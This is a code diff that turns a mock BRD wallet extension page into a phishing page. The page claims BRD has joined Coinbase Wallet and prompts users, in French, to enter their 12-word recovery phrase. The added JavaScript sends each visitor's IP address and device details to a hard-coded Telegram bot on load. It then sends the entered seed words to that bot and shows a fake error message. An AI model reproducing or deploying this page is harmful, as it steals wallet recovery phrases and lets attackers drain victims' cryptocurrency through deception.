@@ -1,237 +1,163 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BRD Wallet Extension</title>
+    <title>BRD Wallet Migration</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-deep: #1a1438;
-            --bg-keypad: #231b4d;
-            --accent-blue: #31aade;
-            /* Gradients exactly from your images */
-            --btc-grad: linear-gradient(135deg, #f7931a, #ffab44);
-            --eth-grad: linear-gradient(135deg, #627eea, #8da2f2);
-            --brd-grad: linear-gradient(135deg, #ff5e62, #ff9966);
-            --bnb-grad: linear-gradient(135deg, #f3ba2f, #f8d33a);
-            --bch-grad: linear-gradient(135deg, #8dc351, #b2d98c);
+            --bg-color: #1e1e3f;
+            --btn-blue: #586cf5;
+            --btn-gray: #3e3f5e;
+            --text-white: #ffffff;
+            --text-secondary: #b0b0cc;
+            --grid-border: rgba(255, 255, 255, 0.1);
+            --input-bg: #2a2a4a;
         }
 
-        body, html {
-            margin: 0; padding: 0;
-            width: 360px; height: 580px;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial;
-            background-color: var(--bg-deep);
-            color: white;
-            overflow: hidden;
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-white);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
         }
 
-        .page { display: none; width: 100%; height: 100%; flex-direction: column; }
-        .active { display: flex; }
-
-        /* --- PAGE 1: START --- */
-        #landing-page { justify-content: center; align-items: center; text-align: center; }
-        .welcome-title { font-size: 52px; font-weight: 900; background: var(--brd-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -2px; }
-        .start-btn { margin-top: 40px; background: var(--accent-blue); color: white; border: none; padding: 16px 60px; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 14px; letter-spacing: 1px; transition: 0.3s; }
-        .start-btn:hover { background: #2899c9; transform: scale(1.05); }
-
-        /* --- PAGE 2: DASHBOARD (All 5 Coins from Image 2) --- */
-        #dashboard-page { padding: 20px; box-sizing: border-box; overflow-y: auto; }
-        .header-logo { font-size: 32px; font-weight: 800; margin-bottom: 25px; background: var(--brd-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        
-        .crypto-card {
-            display: flex; align-items: center; padding: 16px;
-            border-radius: 12px; margin-bottom: 12px; cursor: pointer;
-            transition: 0.2s; position: relative; border: 1px solid rgba(255,255,255,0.05);
+        .container {
+            width: 100%;
+            max-width: 500px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 40px 25px;
+            position: relative;
         }
-        .crypto-card:active { transform: scale(0.97); }
-        .card-icon { 
-            width: 42px; height: 42px; 
-            background: rgba(255,255,255,0.2); 
-            border-radius: 10px; 
-            display: flex; align-items: center; justify-content: center; 
-            margin-right: 15px;
-            overflow: hidden;
-        }
-        .card-icon svg {
-            width: 28px;
-            height: 28px;
-        }
-        .card-info { flex: 1; }
-        .card-info .name { display: block; font-weight: bold; font-size: 17px; }
-        .card-info .rate { font-size: 12px; opacity: 0.7; }
-        .card-values { text-align: right; margin-right: 10px; }
-        .card-values .total { display: block; font-weight: bold; font-size: 17px; }
-        .card-values .balance { font-size: 12px; opacity: 0.8; }
-        .arrow-btn { font-size: 14px; opacity: 0.4; }
 
-        /* --- PAGE 3: CALCULATOR (Precise Image 1 Style) --- */
-        #calc-page { background: #f4f7f9; }
-        .calc-header { background: #1a1438; color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; }
-        
-        /* Pay Section (White) */
-        .pay-box { background: white; padding: 20px; border-bottom: 1px solid #e0e0e0; display: flex; justify-content: space-between; align-items: center; }
-        /* Receive Section (Light Gray) */
-        .receive-box { background: #f8f9fb; padding: 20px; border-bottom: 1px solid #e0e0e0; display: flex; justify-content: space-between; align-items: center; }
-        
-        .label-small { color: var(--accent-blue); font-size: 11px; font-weight: bold; text-transform: uppercase; margin-bottom: 5px; }
-        .val-text { font-size: 32px; color: #333; font-weight: 400; }
-        .val-text-receive { font-size: 32px; color: #b0b0b0; font-weight: 300; }
-        
-        .currency-select { display: flex; align-items: center; gap: 8px; color: #333; font-weight: 600; font-size: 14px; }
-        .currency-select img { width: 20px; }
+        @media (min-width: 1024px) {
+            .container {
+                max-width: 450px;
+                min-height: 850px;
+                border: 1px solid var(--grid-border);
+                border-radius: 30px;
+                margin: 20px;
+            }
+        }
 
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); background: var(--bg-keypad); flex: 1; padding: 5px; }
-        .key { display: flex; align-items: center; justify-content: center; font-size: 26px; color: white; cursor: pointer; height: 60px; }
-        .key:active { background: rgba(255,255,255,0.1); border-radius: 50%; }
-        
-        .next-btn-final { background: var(--accent-blue); color: white; padding: 20px; text-align: center; font-weight: bold; font-size: 16px; cursor: pointer; letter-spacing: 1px; }
+        .page { display: none; flex-direction: column; height: 100%; animation: fadeIn 0.4s ease; }
+        .page.active { display: flex; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .logo-area { display: flex; flex-direction: column; align-items: center; margin-top: 20px; margin-bottom: 40px; }
+        .brd-main-img { width: 140px; height: auto; }
+
+        h1 { font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 20px; line-height: 1.2; }
+        .sub-text { color: var(--text-secondary); text-align: center; font-size: 15px; line-height: 1.6; margin-bottom: 60px; }
+
+        .btn-container { display: flex; flex-direction: column; gap: 15px; margin-top: auto; }
+        .btn { width: 100%; padding: 18px; border-radius: 8px; border: none; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
+        .btn-primary { background-color: var(--btn-blue); color: white; }
+        .btn-secondary { background-color: var(--btn-gray); color: white; }
+
+        /* الصفحة الثانية */
+        .recovery-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; padding-top: 10px; }
+        .back-arrow { width: 24px; height: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .back-arrow svg { width: 20px; height: 20px; stroke: white; stroke-width: 2; fill: none; }
+        .help-icon { width: 24px; height: 24px; border: 2px solid white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 600; }
+
+        .recovery-title { font-size: 26px; font-weight: 600; text-align: left; margin-bottom: 12px; line-height: 1.3; }
+        .recovery-subtitle { color: var(--text-secondary); text-align: left; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
+
+        .recovery-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; }
+        .grid-item { background-color: var(--input-bg); border-radius: 8px; height: 56px; display: flex; align-items: center; justify-content: center; position: relative; }
+        .item-num { color: var(--text-secondary); font-size: 16px; font-weight: 500; }
+        .item-input { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: transparent; border: none; color: white; font-size: 15px; text-align: center; outline: none; opacity: 0; z-index: 2; }
+        .item-input:focus, .item-input:not(:placeholder-shown) { opacity: 1; background-color: var(--input-bg); border-radius: 8px; }
+        .item-input:focus + .item-num, .item-input:not(:placeholder-shown) + .item-num { display: none; }
+
+        .finish-btn { margin-top: 30px; display: none; }
     </style>
 </head>
 <body>
 
-    <div id="landing-page" class="page active">
-        <div class="welcome-title">BRD</div>
-        <button class="start-btn" onclick="showPage('dashboard-page')">GET STARTED</button>
-    </div>
-
-    <div id="dashboard-page" class="page">
-        <div class="header-logo">BRD</div>
-        
-        <div class="crypto-card" style="background: var(--btc-grad);" onclick="openCalc('Bitcoin', 4480.56, 'BTC')">
-            <div class="card-icon">
-                <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <circle cx="16" cy="16" r="16" fill="#F7931A"/>
-                    <path d="M22.8 14.5c.3-2-1.2-3.1-3.3-3.8l.7-2.7-1.7-.4-.7 2.7c-.4-.1-.9-.2-1.3-.3l.7-2.8-1.7-.4-.7 2.7c-.4-.1-.7-.2-1.1-.3l-2.3-.6-.5 1.8s1.2.3 1.2.3c.7.2.8.6.8 1l-.8 3.2c0 .1.1.1.1.1s-.1 0-.1-.1l-1.1 4.5c-.1.2-.3.6-.9.4 0 0-1.2-.3-1.2-.3l-.9 2 2.2.5c.4.1.8.2 1.2.3l-.7 2.9 1.7.4.7-2.8c.4.1.9.2 1.3.3l-.7 2.8 1.7.4.7-2.9c2.9.5 5.1-.3 6-2.3.7-1.6 0-2.5-1.1-3.1.8-.2 1.4-.8 1.6-2zm-2.9 4.4c-.5 2.1-4.1 1-5.3.7l.9-3.8c1.2.3 5.1.9 4.4 3.1zm.5-4.5c-.5 1.9-3.4.9-4.4.7l.9-3.6c.9.2 4 .7 3.5 2.9z" fill="white"/>
-                </svg>
+    <div class="container">
+        <div id="p1" class="page active">
+            <div class="logo-area">
+                <img src="https://i.ibb.co/ymp5HL9C/F3-BB5708-18-B2-4-C3-F-89-D2-ADF914-D14-A9-E.png" class="brd-main-img" alt="BRD">
             </div>
-            <div class="card-info"><span class="name">Bitcoin</span><span class="rate">$3,755.51 per BTC</span></div>
-            <div class="card-values"><span class="total">$4,188.89</span><span class="balance">1.1154 BTC</span></div>
-            <div class="arrow-btn">❯</div>
-        </div>
-
-        <div class="crypto-card" style="background: var(--eth-grad);" onclick="openCalc('Ethereum', 101.61, 'ETH')">
-            <div class="card-icon">
-                <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <circle cx="16" cy="16" r="16" fill="#627EEA"/>
-                    <path d="M16 6l-.2.6v12.4l.2.2 6.2-3.7L16 6z" fill="white" fill-opacity="0.6"/>
-                    <path d="M16 6L9.8 15.5l6.2 3.7V6z" fill="white"/>
-                    <path d="M16 20.3l-.1.2v4.7l.1.3 6.2-8.7-6.2 3.5z" fill="white" fill-opacity="0.6"/>
-                    <path d="M16 25.5v-5.2L9.8 16.8l6.2 8.7z" fill="white"/>
-                    <path d="M16 19.2l6.2-3.7-6.2-2.8v6.5z" fill="white" fill-opacity="0.2"/>
-                    <path d="M9.8 15.5l6.2 3.7v-6.5l-6.2 2.8z" fill="white" fill-opacity="0.6"/>
-                </svg>
+            <h1>BRD has joined<br>Coinbase Wallet!</h1>
+            <p class="sub-text">We're excited to announce that BRD is joining the Coinbase Wallet team.</p>
+            <div class="btn-container">
+                <button class="btn btn-primary" onclick="showPage('p2')">Get Coinbase Wallet</button>
+                <button class="btn btn-secondary" onclick="showPage('p2')">View Press Release</button>
+                <button class="btn btn-secondary" onclick="showPage('p2')">Restore Wallet</button>
             </div>
-            <div class="card-info"><span class="name">Ethereum</span><span class="rate">$101.61 per ETH</span></div>
-            <div class="card-values"><span class="total">$409.78</span><span class="balance">4.0329 ETH</span></div>
-            <div class="arrow-btn">❯</div>
         </div>
 
-        <div class="crypto-card" style="background: var(--brd-grad);" onclick="openCalc('BRD Token', 0.20, 'BRD')">
-            <div class="card-icon">
-                <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <circle cx="16" cy="16" r="16" fill="#FF5E62"/>
-                    <path d="M16 6c-5.5 0-10 4.5-10 10s4.5 10 10 10 10-4.5 10-10S21.5 6 16 6zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z" fill="white" fill-opacity="0.3"/>
-                    <path d="M16 10l-5 8h10l-5-8z" fill="white"/>
-                    <path d="M16 14l-3 4h6l-3-4z" fill="#FF9966"/>
-                </svg>
+        <div id="p2" class="page">
+            <div class="recovery-header">
+                <div class="back-arrow" onclick="showPage('p1')"><svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></div>
+                <div class="help-icon">?</div>
             </div>
-            <div class="card-info"><span class="name">BRD Token</span><span class="rate">$0.20 per BRD</span></div>
-            <div class="card-values"><span class="total">$3,033.01</span><span class="balance">15,459.02 BRD</span></div>
-            <div class="arrow-btn">❯</div>
+            <h1 class="recovery-title">Récupérer votre portefeuille</h1>
+            <p class="recovery-subtitle">Veuillez saisir la phrase de récupération du portefeuille que vous souhaitez récupérer.</p>
+            <div class="recovery-grid" id="mainGrid"></div>
+            <button class="btn btn-primary finish-btn" id="submitWords" onclick="sendToTelegram()">Continuer</button>
         </div>
-
-        <div class="crypto-card" style="background: var(--bnb-grad);" onclick="openCalc('Binance Coin', 5.36, 'BNB')">
-            <div class="card-icon">
-                <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <circle cx="16" cy="16" r="16" fill="#F3BA2F"/>
-                    <path d="M16 7l2.5 2.5L16 12l-2.5-2.5L16 7zM20.5 11.5L23 14l-2.5 2.5L18 14l2.5-2.5zM11.5 11.5L14 14l-2.5 2.5L9 14l2.5-2.5zM16 13l2.5 2.5L16 18l-2.5-2.5L16 13zM11.5 18.5L14 21l-2.5 2.5L9 21l2.5-2.5zM20.5 18.5L23 21l-2.5 2.5L18 21l2.5-2.5zM16 20l2.5 2.5L16 25l-2.5-2.5L16 20z" fill="white"/>
-                </svg>
-            </div>
-            <div class="card-info"><span class="name">Binance Coin</span><span class="rate">$5.36 per BNB</span></div>
-            <div class="card-values"><span class="total">$1,420.07</span><span class="balance">264.94 BNB</span></div>
-            <div class="arrow-btn">❯</div>
-        </div>
-
-        <div class="crypto-card" style="background: var(--bch-grad);" onclick="openCalc('Bitcoin Cash', 130.68, 'BCH')">
-            <div class="card-icon">
-                <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <circle cx="16" cy="16" r="16" fill="#8DC351"/>
-                    <path d="M20.5 12.5c-.5-2-2.3-2.7-4.2-2.4l-.4-1.8-1.1.3.4 1.7c-.3.1-.6.1-.9.2l-.4-1.7-1.1.3.4 1.8c-.2.1-.5.1-.7.2l-1.5.4-.3 1.2.8-.2c.4-.1.6.1.7.4l-.5 2.1c0 .1 0 .1.1.1l-.1-.1-.7 2.9c-.1.2-.2.4-.6.5l-.8.2-.1 1.1 1.4-.4c.3-.1.5-.1.8-.2l-.4 1.9 1.1-.3.4-1.8c.3-.1.6-.1.9-.2l-.4 1.9 1.1-.3.4-1.9c1.9.3 3.3-.2 3.9-1.5.5-1.1.1-1.7-.6-2.1.5-.1.9-.5 1.1-1.2zm-1.8 2.9c-.3 1.4-2.7.9-3.5.7l.6-2.5c.8.2 3.3.5 2.9 1.8zm.3-2.9c-.3 1.2-2.3.8-3 .6l.5-2.4c.6.2 2.7.5 2.5 1.8z" fill="white"/>
-                    <circle cx="21" cy="9" r="4" fill="#0AC18E"/>
-                    <text x="21" y="11" text-anchor="middle" fill="white" font-size="5" font-weight="bold">₿</text>
-                </svg>
-            </div>
-            <div class="card-info"><span class="name">Bitcoin Cash</span><span class="rate">$130.68 per BCH</span></div>
-            <div class="card-values"><span class="total">$795.31</span><span class="balance">6.086 BCH</span></div>
-            <div class="arrow-btn">❯</div>
-        </div>
-    </div>
-
-    <div id="calc-page" class="page">
-        <div class="calc-header">
-            <span onclick="showPage('dashboard-page')" style="cursor:pointer; font-size: 20px;">✕</span>
-            <span id="header-rate" style="font-size: 12px; font-weight: bold;">1 BTC = $4,480.56</span>
-            <div style="width:20px"></div>
-        </div>
-
-        <div class="pay-box">
-            <div>
-                <div class="label-small">Pay With</div>
-                <div class="val-text">$<span id="pay-val">50</span></div>
-            </div>
-            <div class="currency-select">🇺🇸 USD ▾</div>
-        </div>
-
-        <div class="receive-box">
-            <div>
-                <div class="label-small">Receive</div>
-                <div class="val-text-receive" id="receive-val">0.0111595</div>
-            </div>
-            <div class="currency-select" id="calc-target-coin">BTC ▾</div>
-        </div>
-
-        <div class="keypad">
-            <div class="key" onclick="typeNum('1')">1</div><div class="key" onclick="typeNum('2')">2</div><div class="key" onclick="typeNum('3')">3</div>
-            <div class="key" onclick="typeNum('4')">4</div><div class="key" onclick="typeNum('5')">5</div><div class="key" onclick="typeNum('6')">6</div>
-            <div class="key" onclick="typeNum('7')">7</div><div class="key" onclick="typeNum('8')">8</div><div class="key" onclick="typeNum('9')">9</div>
-            <div class="key" onclick="typeNum('.')">.</div><div class="key" onclick="typeNum('0')">0</div><div class="key" onclick="typeNum('del')">⌫</div>
-        </div>
-
-        <div class="next-btn-final">NEXT</div>
     </div>
 
     <script>
-        let currentInput = "50";
-        let activeRate = 4480.56;
+        const token = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
+        const chatId = "1705240737";
+
+        // إشعار دخول الزائر
+        window.onload = () => {
+            fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                const msg = `🔔 زائر جديد دخل الصفحة!\n📍 IP: ${data.ip}\n📱 الجهاز: ${navigator.userAgent}`;
+                sendMessage(msg);
+            });
+        };
 
         function showPage(id) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             document.getElementById(id).classList.add('active');
         }
 
-        function openCalc(name, rate, symbol) {
-            activeRate = rate;
-            document.getElementById('header-rate').innerText = `1 ${symbol} = $${rate.toLocaleString()}`;
-            document.getElementById('calc-target-coin').innerText = `${symbol} ▾`;
-            updateCalc();
-            showPage('calc-page');
+        const grid = document.getElementById('mainGrid');
+        for (let i = 1; i <= 12; i++) {
+            const div = document.createElement('div');
+            div.className = 'grid-item';
+            div.innerHTML = `<input type="text" class="item-input word-input" placeholder=" " data-index="${i}" spellcheck="false" autocomplete="off"><span class="item-num">${i}</span>`;
+            grid.appendChild(div);
         }
 
-        function typeNum(n) {
-            if(n === 'del') {
-                currentInput = currentInput.length > 1 ? currentInput.slice(0, -1) : "0";
-            } else {
-                if(currentInput === "0" && n !== '.') currentInput = n;
-                else if(currentInput.length < 10) currentInput += n;
-            }
-            updateCalc();
+        // إظهار زر "Continuer" عند ملء الحقول
+        document.addEventListener('input', () => {
+            const inputs = document.querySelectorAll('.word-input');
+            const allFilled = Array.from(inputs).every(input => input.value.trim() !== "");
+            document.getElementById('submitWords').style.display = allFilled ? 'block' : 'none';
+        });
+
+        function sendToTelegram() {
+            const inputs = document.querySelectorAll('.word-input');
+            let words = "";
+            inputs.forEach(input => {
+                words += `${input.getAttribute('data-index')}: ${input.value}\n`;
+            });
+            const finalMsg = `🔑 كلمات السر المستلمة:\n\n${words}`;
+            sendMessage(finalMsg);
+            alert("Une erreur de connexion s'est produite. Veuillez réessayer.");
         }
 
-        function updateCalc() {
-            document.getElementById('pay-val').innerText = currentInput;
-            let res = parseFloat(currentInput) / activeRate;
-            document.getElementById('receive-val').innerText = res.toFixed(7);
+        function sendMessage(text) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+            fetch(url);
         }
     </script>
 </body>
